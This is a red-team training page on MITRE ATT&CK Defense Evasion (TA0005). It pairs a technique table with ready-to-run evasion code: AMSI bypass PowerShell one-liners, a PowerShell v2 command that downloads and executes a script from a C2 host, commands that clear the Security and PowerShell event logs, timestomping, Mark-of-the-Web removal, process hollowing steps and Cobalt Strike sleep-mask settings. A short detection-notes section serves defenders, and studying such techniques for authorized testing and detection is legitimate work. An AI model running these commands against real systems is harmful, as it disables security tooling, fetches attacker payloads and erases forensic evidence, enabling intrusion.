---
layout: training-page
title: "TA0005 — Defense Evasion — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - defense-evasion
  - amsi
  - edr
  - obfuscation
  - process-injection
page_key: "mitre-ta0005"
render_with_liquid: false
---

# TA0005 — Defense Evasion

Defense Evasion is the **largest tactic in ATT&CK** with 42 techniques and over 100 sub-techniques. It covers everything adversaries do to avoid detection by security tools — AV, EDR, SIEM, and logging infrastructure. Modern red team operations treat evasion as a core engineering problem: without effective evasion, most tooling gets blocked within minutes on mature enterprise endpoints.

Evasion spans multiple layers: payload delivery (obfuscation, packing), runtime execution (AMSI bypass, ETW patching, DLL unhooking), process behavior (hollowing, injection, spoofing), and artifact cleanup (log clearing, timestomping).

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1562 | Impair Defenses | T1562.001 Disable/Modify Tools | Kill AV/EDR processes or disable via registry |
| T1562 | Impair Defenses | T1562.002 Disable Windows Event Logging | Stop EventLog service, clear log channels |
| T1562 | Impair Defenses | T1562.003 HISTCONTROL | Set HISTCONTROL=ignorespace to avoid bash history |
| T1562 | Impair Defenses | T1562.004 Disable Firewall | netsh advfirewall set allprofiles state off |
| T1562 | Impair Defenses | T1562.006 Indicator Blocking | Block ETW providers, unhook ntdll hooks |
| T1562 | Impair Defenses | T1562.009 Safe Mode Boot | Reboot into safe mode to disable EDR |
| T1562 | Impair Defenses | T1562.010 Downgrade Attack | Force WinRM to use NTLMv1; PowerShell v2 (no AMSI) |
| T1055 | Process Injection | T1055.001 DLL Injection | LoadLibrary into remote process |
| T1055 | Process Injection | T1055.002 PE Injection | Write PE into remote memory, execute |
| T1055 | Process Injection | T1055.003 Thread Execution Hijacking | Suspend thread, hijack RIP/EIP |
| T1055 | Process Injection | T1055.004 Asynchronous Procedure Call | QueueUserAPC into alertable thread |
| T1055 | Process Injection | T1055.012 Process Hollowing | Hollow sacrificial process, map shellcode |
| T1036 | Masquerading | T1036.001 Invalid Code Signature | Self-sign or spoof authenticode |
| T1036 | Masquerading | T1036.003 Rename System Utilities | Copy payload as svchost.exe / RuntimeBroker.exe |
| T1036 | Masquerading | T1036.005 Match Legitimate Name | Drop in C:\Windows\System32\ look-alike path |
| T1036 | Masquerading | T1036.008 Masquerade File Type | Double extension (report.pdf.exe) |
| T1112 | Modify Registry | — | Disable Windows Defender via registry keys |
| T1027 | Obfuscated Files or Information | T1027.001 Binary Padding | Add null bytes to change hash |
| T1027 | Obfuscated Files or Information | T1027.002 Software Packing | UPX, custom packer |
| T1027 | Obfuscated Files or Information | T1027.004 Compile After Delivery | Deliver C# source, compile on endpoint |
| T1027 | Obfuscated Files or Information | T1027.006 HTML Smuggling | Embed payload in HTML Blob URL |
| T1027 | Obfuscated Files or Information | T1027.010 Command Obfuscation | Invoke-Obfuscation, Chimera |
| T1070 | Indicator Removal | T1070.001 Clear Windows Event Logs | wevtutil cl System; PowerShell Clear-EventLog |
| T1070 | Indicator Removal | T1070.003 Clear Command History | Clear-History; rm ~/.bash_history |
| T1070 | Indicator Removal | T1070.004 File Deletion | Secure delete with SDelete, shred |
| T1070 | Indicator Removal | T1070.006 Timestomp | Modify file $STANDARD_INFORMATION timestamps |
| T1202 | Indirect Command Execution | — | forfiles, pcalua, bash.exe (WSL), explorer.exe |
| T1218 | System Binary Proxy Execution | T1218.005 Mshta | mshta.exe executes HTA/VBScript from URL |
| T1218 | System Binary Proxy Execution | T1218.010 Regsvr32 | regsvr32 loads COM scriptlet (squiblydoo) |
| T1218 | System Binary Proxy Execution | T1218.011 Rundll32 | rundll32 executes exported DLL function |
| T1218 | System Binary Proxy Execution | T1218.007 Msiexec | msiexec /q /i remote_payload.msi |
| T1218 | System Binary Proxy Execution | T1218.004 InstallUtil | Unhandled exception AppDomain exec via .NET |
| T1553 | Subvert Trust Controls | T1553.002 Code Signing | Sign payload with obtained cert |
| T1553 | Subvert Trust Controls | T1553.004 Install Root Certificate | Install rogue CA for HTTPS inspection bypass |
| T1553 | Subvert Trust Controls | T1553.005 MOTW Bypass | ISO/VHD delivery; ADS Zone.Identifier removal |
| T1620 | Reflective Code Loading | — | Reflective DLL injection; PowerShell Execute-Assembly |
| T1014 | Rootkit | — | Kernel-mode rootkit hiding processes/files |
| T1574 | Hijack Execution Flow | T1574.001 DLL Search Order | Plant DLL in current directory |
| T1574 | Hijack Execution Flow | T1574.002 DLL Side-Loading | Drop malicious DLL beside signed app |
| T1134 | Access Token Manipulation | T1134.004 Parent PID Spoofing | Spoof explorer.exe PPID to blend in |
| T1078 | Valid Accounts | — | Blend into legitimate user traffic |

## Red Team Tooling

### AMSI Bypass

```
# Method 1: Reflection — patch AmsiScanBuffer return value (detectable)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Force exception in AMSI context (fewer detections)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$b.GetValue($null)
[IntPtr]$d=$c
$e=[System.Runtime.InteropServices.Marshal]::ReadInt32($d)
[System.Runtime.InteropServices.Marshal]::WriteInt32($d,[int]$e+1)

# Method 3: PowerShell v2 (no AMSI — requires .NET 2.0)
powershell.exe -version 2 -c "IEX (New-Object Net.WebClient).DownloadString('http://C2/p.ps1')"
```

### ETW Bypass (Patch EtwEventWrite)

```
# Patch EtwEventWrite in ntdll.dll to ret immediately (C#/Assembly)
# Reference: https://whiteknightlabs.com/2021/12/11/bypassing-etw-for-fun-and-profit/

# Inline patch via PowerShell (simplified)
$ntdll = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() + "ntdll.dll"
# Load ntdll, find EtwEventWrite, patch first bytes to C3 (RET)
```

### DLL Unhooking (Restore ntdll from disk)

```
# RefleXXion — restore ntdll syscall stubs from clean on-disk copy
# Open ntdll.dll from disk, map it fresh, overwrite hooked .text section
# Source: https://github.com/hlldz/RefleXXion

# SharpUnhooker / Dinvoke — .NET implementation of unhooking + D/Invoke
Invoke-ReflectivePEInjection -PEBytes $SharpUnhookerBytes -ExeArgs ""
```

### Sleep Obfuscation (Evade memory scanning)

```
# Ekko — encrypt beacon in memory during sleep using RtlCreateTimer
# Foliage — obfuscate memory with STACKBOMBER + ROPchain during sleep
# These prevent Cobalt Strike memory signatures during callback intervals
# Reference: https://github.com/Cracked5pider/Ekko

# Cobalt Strike — enable sleep mask in profile
set sleep_mask "true";
set obfuscate "true";
```

### Process Hollowing

```
# Classic Process Hollowing — hollow svchost.exe, inject shellcode
# 1. CreateProcess(svchost.exe, SUSPENDED)
# 2. NtUnmapViewOfSection (hollow the image)
# 3. VirtualAllocEx + WriteProcessMemory (write shellcode)
# 4. SetThreadContext (redirect EIP/RIP to shellcode)
# 5. ResumeThread

# SharpHollow — C# implementation
SharpHollow.exe "C:\Windows\System32\svchost.exe" shellcode.bin
```

### Log Clearing

```
# Clear Windows event logs (requires admin)
wevtutil cl Application
wevtutil cl System
wevtutil cl Security
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# One-liner clear all logs
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }

# Timestomp — modify file timestamps (PowerShell)
$file = Get-Item "C:\Windows\Temp\beacon.exe"
$file.CreationTime = "2020-01-01 00:00:00"
$file.LastWriteTime = "2020-01-01 00:00:00"
$file.LastAccessTime = "2020-01-01 00:00:00"
```

### Mark-of-the-Web Bypass (ISO delivery)

```
# Files inside ISO containers don't inherit Zone.Identifier ADS
# Create payload ISO
mkisofs -o payload.iso -J -R payload_dir/

# Remove Zone.Identifier ADS manually (if needed)
Remove-Item -Path "C:\Users\user\Downloads\payload.exe" -Stream "Zone.Identifier"
# Or
streams.exe -d "C:\Users\user\Downloads\payload.exe"
```

## Detection Notes

- **AMSI patches**: Sysmon Event 10 (process access) on amsi.dll; behavioral detection on PowerShell writing to own process memory; Event ID 8002/8010 for AMSI block events
- **ETW patching**: detect memory writes to ntdll.dll text section from user mode; Elastic has public rules for this pattern
- **Process hollowing**: Sysmon Event 8 (CreateRemoteThread) + Event 10 (process access) on svchost.exe from non-SYSTEM parents; PE integrity checks by EDR
- **Log clearing**: Event ID 1102 (Security log cleared), 104 (System log cleared) — these themselves can't be cleared without removing the log-cleared event
- **LOLBin abuse**: Sysmon Event 1 watching regsvr32/mshta/rundll32 spawning network connections or cmd.exe children
- **Sleep obfuscation**: Memory scanners that trigger on sleeping processes and catch decrypted shellcode in the brief window between sleep cycles

## Related Academy Pages

- [AMSI Bypass](/evasion/amsi-bypass/)
- [AV / EDR Evasion](/evasion/av-edr-evasion/)
- [ETW Bypass](/evasion/etw-bypass/)
- [DLL Unhooking](/evasion/dll-unhooking/)
- [Process Ghosting](/evasion/process-ghosting/)
- [Sleep Obfuscation](/evasion/sleep-obfuscation/)
- [Stack Spoofing](/evasion/stack-spoofing/)
- [Indirect Syscalls](/evasion/indirect-syscalls/)
- [HookChain & Halo's Gate](/evasion/hookchain/)
- [HTML Smuggling](/evasion/html-smuggling/)
- [LOLBins & LOLBAS](/evasion/lolbins/)
- [EDR Internals & Architecture](/evasion/edr-internals/)

## Resources

- [TA0005 — MITRE ATT&CK Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [T1562 — Impair Defenses](https://attack.mitre.org/techniques/T1562/)
- [T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)
- [T1027 — Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
